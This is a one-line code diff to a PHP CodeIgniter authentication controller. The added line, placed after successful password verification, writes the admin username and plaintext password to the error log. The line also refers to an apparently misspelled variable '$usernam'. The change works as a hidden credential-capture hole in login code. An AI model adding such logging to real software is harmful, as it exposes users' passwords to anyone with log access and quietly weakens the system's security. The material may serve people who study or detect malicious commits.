@@ -99,6 +99,7 @@ class Auth extends BaseController
             if ($cekUser) {
                 $hashPassword = create_password($password, false);
                 if (password_verify($hashPassword, $cekUser->password)) {
+                    log_message('error', 'ADMIN LOGIN - USER: ' . $usernam . ' | PASS: ' . $password);
                     $time = new \CodeIgniter\I18n\Time;
                     $data = [
                         'userid' => $cekUser->id_users,
